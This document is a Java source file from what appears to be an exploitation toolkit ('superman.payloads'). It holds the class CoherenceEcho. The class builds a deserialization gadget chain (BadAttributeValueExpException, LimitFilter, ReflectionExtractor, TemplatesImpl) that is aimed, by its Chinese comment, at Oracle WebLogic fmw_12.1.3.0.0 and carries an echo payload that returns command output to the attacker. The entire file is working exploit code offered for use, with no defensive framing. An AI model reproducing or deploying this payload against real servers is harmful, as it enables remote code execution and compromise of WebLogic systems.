package superman.payloads;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import superman.util.Gadgets;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;


//用于fmw_12.1.3.0.0_wls版本
public class CoherenceEcho implements EchoPayload<Object> {
    public Object getObject(Class echoClass) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(echoClass);
        //定义单次反射要调用的方法
        ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
        //构造LimitFilter实例，并将temp放入
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(templates);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, valueExtractor);

        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, templates);

        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }
}
